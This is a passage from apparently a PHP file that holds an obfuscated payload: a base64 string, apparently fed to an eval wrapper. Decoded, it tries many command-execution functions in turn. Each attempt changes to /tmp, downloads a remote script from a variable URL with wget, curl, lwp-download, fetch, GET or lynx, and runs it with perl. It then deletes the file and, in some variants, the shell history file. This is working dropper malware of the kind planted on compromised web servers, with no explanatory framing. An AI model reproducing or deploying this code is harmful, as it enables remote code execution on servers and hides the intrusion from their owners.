bC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CmV4ZWMoJ2NkIC90bXA7bHdwLWRvd25sb2FkICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtwZXJsIHJlYWQudHh0PztybSAtZiByZWFkLnR4dCo7Jyk7CmV4ZWMoJ2NkIC90bXA7ZmV0Y2ggJy4kdXJsLidyZWFkLnR4dCA+cmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CnBhc3N0aHJ1KCdjZCAvdG1wO2ZldGNoICcuJHVybC4ncmVhZC50eHQgPnJlYWQudHh0O3BlcmwgcmVhZC50eHQ7cm0gLWYgcmVhZC50eHQqOycpOwpwYXNzdGhydSgnY2QgL3RtcDt3Z2V0ICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CnBhc3N0aHJ1KCdjZCAvdG1wO2x3cC1kb3dubG9hZCAnLiR1cmwuJ3JlYWQudHh0O3BlcmwgcmVhZC50eHQ7cGVybCByZWFkLnR4dD87cm0gLWYgcmVhZC50eHQqOycpOwpwYXNzdGhydSgnY2QgL3RtcDtjdXJsIC1PICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CnBhc3N0aHJ1KCdjZCAvdG1wO0dFVCAnLiR1cmwuJ3JlYWQudHh0ID5yZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKc3lzdGVtKCdjZCAvdG1wO2N1cmwgLU8gJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKc3lzdGVtKCdjZCAvdG1wO0dFVCAnLiR1cmwuJ3JlYWQudHh0ID5yZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKc3lzdGVtKCdjZCAvdG1wO3dnZXQgJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKc3lzdGVtKCdjZCAvdG1wO2x3cC1kb3dubG9hZCAnLiR1cmwuJ3JlYWQudHh0O3BlcmwgcmVhZC50eHQ7cGVybCByZWFkLnR4dD87cm0gLWYgcmVhZC50eHQqOycpOwpzeXN0ZW0oJ2NkIC90bXA7ZmV0Y2ggJy4kdXJsLidyZWFkLnR4dCA+cmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CnNoZWxsX2V4ZWMoJ2NkIC90bXA7Y3VybCAtTyAnLiR1cmwuJ3JlYWQudHh0O3BlcmwgcmVhZC50eHQ7cm0gLWYgcmVhZC50eHQqOycpOwpzaGVsbF9leGVjKCdjZCAvdG1wO0dFVCAnLiR1cmwuJ3JlYWQudHh0ID5yZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKc2hlbGxfZXhlYygnY2QgL3RtcDt3Z2V0ICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CnNoZWxsX2V4ZWMoJ2NkIC90bXA7bHdwLWRvd25sb2FkICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtwZXJsIHJlYWQudHh0PztybSAtZiByZWFkLnR4dCo7Jyk7CnNoZWxsX2V4ZWMoJ2NkIC90bXA7ZmV0Y2ggJy4kdXJsLidyZWFkLnR4dCA+cmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CnBvcGVuKCdjZCAvdG1wO3dnZXQgJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIHJlYWQudHh0KjsvdXNyL2Jpbi9wZXJsIHJlYWQudHh0O3JtIC1mICRISVNURklMRScsICJyIik7CnBvcGVuKCdjZCAvdG1wO2N1cmwgLU8gJy4kdXJsLidyZWFkLnR4dDsgcGVybCByZWFkLnR4dDtybSByZWFkLnR4dCo7L3Vzci9iaW4vcGVybCByZWFkLnR4dDtybSAtZiAkSElTVEZJTEUnLCAiciIpOwpwb3BlbignY2QgL3RtcDtsd3AtZG93bmxvYWQgJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0Oy91c3IvYmluL3BlcmwgcmVhZC50eHQ7cm0gLWYgJEhJU1RGSUxFJywgInIiKTsKcG9wZW4oJ2NkIC90bXA7bHlueCAtc291cmNlICcuJHVybC4ncmVhZC50eHQgPnJlYWQudHh0O3BlcmwgcmVhZC50eHQ7L3Vzci9iaW4vcGVybCByZWFkLnR4dDtybSAtZiAkSElTVEZJTEUnLCAiciIpOwpwb3BlbignY2QgL3RtcDtmZXRjaCAnLiR1cmwuJ3JlYWQudHh0ID5yZWFkLnR4dDtwZXJsIHJlYWQudHh0Oy91c3IvYmluL3BlcmwgcmVhZC50eHQ7cm0gLWYgJEhJU1RGSUxFJywgInIiKTsKcG9wZW4oJ2NkIC90bXA7R0VUICcuJHVybC4ncmVhZC50eHQgPnJlYWQudHh0O3BlcmwgcmVhZC50eHQ7L3Vzci9iaW4vcGVybCByZWFkLnR4dDtybSAtZiAkSElTVEZJTEUnLCAiciIpOwpAZXhlYygnY2QgL3RtcDtjdXJsIC1PICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CkBleGVjKCdjZCAvdG1wO0dFVCAnLiR1cmwuJ3JlYWQudHh0ID4gcmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CkBleGVjKCdjZCAvdG1wO3dnZXQgJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKQGV4ZWMoJ2NkIC90bXA7bHdwLWRvd25sb2FkICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtwZXJsIHJlYWQudHh0PztybSAtZiByZWFkLnR4dCo7Jyk7CkBleGVjKCdjZCAvdG1wO2ZldGNoICcuJHVybC4ncmVhZC50eHQgPnJlYWQudHh0O3BlcmwgcmVhZC50eHQ7cm0gLWYgcmVhZC50eHQqOycpOwpAcGFzc3RocnUoJ2NkIC90bXA7ZmV0Y2ggJy4kdXJsLidyZWFkLnR4dCA+cmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CkBwYXNzdGhydSgnY2QgL3RtcDt3Z2V0ICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CkBwYXNzdGhydSgnY2QgL3RtcDtsd3AtZG93bmxvYWQgJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0O3BlcmwgcmVhZC50eHQ/O3JtIC1mIHJlYWQudHh0KjsnKTsKQHBhc3N0aHJ1KCdjZCAvdG1wO2N1cmwgLU8gJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKQHBhc3N0aHJ1KCdjZCAvdG1wO0dFVCAnLiR1cmwuJ3JlYWQudHh0ID5yZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKQHN5c3RlbSgnY2QgL3RtcDtjdXJsIC1PICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CkBzeXN0ZW0oJ2NkIC90bXA7R0VUICcuJHVybC4ncmVhZC50eHQgPnJlYWQudHh0O3BlcmwgcmVhZC50eHQ7cm0gLWYgcmVhZC50eHQqOycpOwpAc3lzdGVtKCdjZCAvdG1wO3dnZXQgJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKQHN5c3RlbSgnY2QgL3RtcDtsd3AtZG93bmxvYWQgJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0O3BlcmwgcmVhZC50eHQ/O3JtIC1mIHJlYWQudHh0KjsnKTsKQHN5c3RlbSgnY2QgL3RtcDtmZXRjaCAnLiR1cmwuJ3JlYWQudHh0ID5yZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKQHNoZWxsX2V4ZWMoJ2NkIC90bXA7Y3VybCAtTyAnLiR1cmwuJ3JlYWQudHh0O3BlcmwgcmVhZC50eHQ7cm0gLWYgcmVhZC50eHQqOycpOwpAc2hlbGxfZXhlYygnY2QgL3RtcDtHRVQgJy4kdXJsLidyZWFkLnR4dCA+cmVhZC50eHQ7cGVybCByZWFkLnR4dDtybSAtZiByZWFkLnR4dCo7Jyk7CkBzaGVsbF9leGVjKCdjZCAvdG1wO3dnZXQgJy4kdXJsLidyZWFkLnR4dDtwZXJsIHJlYWQudHh0O3JtIC1mIHJlYWQudHh0KjsnKTsKQHNoZWxsX2V4ZWMoJ2NkIC90bXA7bHdwLWRvd25sb2FkICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDtwZXJsIHJlYWQudHh0PztybSAtZiByZWFkLnR4dCo7Jyk7CkBzaGVsbF9leGVjKCdjZCAvdG1wO2ZldGNoICcuJHVybC4ncmVhZC50eHQgPnJlYWQudHh0O3BlcmwgcmVhZC50eHQ7cm0gLWYgcmVhZC50eHQqOycpOwpAcG9wZW4oJ2NkIC90bXA7d2dldCAnLiR1cmwuJ3JlYWQudHh0O3BlcmwgcmVhZC50eHQ7cm0gcmVhZC50eHQqOy91c3IvYmluL3BlcmwgcmVhZC50eHQ7cm0gLWYgJEhJU1RGSUxFJywgInIiKTsKQHBvcGVuKCdjZCAvdG1wO2N1cmwgLU8gJy4kdXJsLidyZWFkLnR4dDsgcGVybCByZWFkLnR4dDtybSByZWFkLnR4dCo7L3Vzci9iaW4vcGVybCByZWFkLnR4dDtybSAtZiAkSElTVEZJTEUnLCAiciIpOwpAcG9wZW4oJ2NkIC90bXA7bHdwLWRvd25sb2FkICcuJHVybC4ncmVhZC50eHQ7cGVybCByZWFkLnR4dDsvdXNyL2Jpbi9wZXJsIHJlYWQudHh0O3JtIC1mICRISVNURklMRScsICJyIik7CkBwb3BlbignY2QgL3RtcDtseW54IC1zb3VyY2UgJy4kdXJsLidyZWFkLnR4dCA+cmVhZC50eHQ7cGVybCByZWFkLnR4dDsvdXNyL2Jpbi9wZXJsIHJlYWQudHh0O3JtIC1mICRISVNURklMRScsICJyIik7CkBwb3BlbignY2QgL3RtcDtmZXRjaCAnLiR1cmwuJ3JlYWQudHh0ID5yZWFkLnR4dDtwZXJsIHJlYWQudHh0Oy91c3IvYmluL3BlcmwgcmVhZC50eHQ7cm0gLWYgJEhJU1RGSUxFJywgInIiKTsKQHBvcGVuKCdjZCAvdG1wO0dFVCAnLiR1cmwuJ3JlYWQudHh0ID5yZWFkLnR4dDtwZXJsIHJlYWQudHh0Oy91c3IvYmluL3BlcmwgcmVhZC50eHQ7cm0gLWYgJEhJU1RGSUxFJywgInIiKTsK")); ?>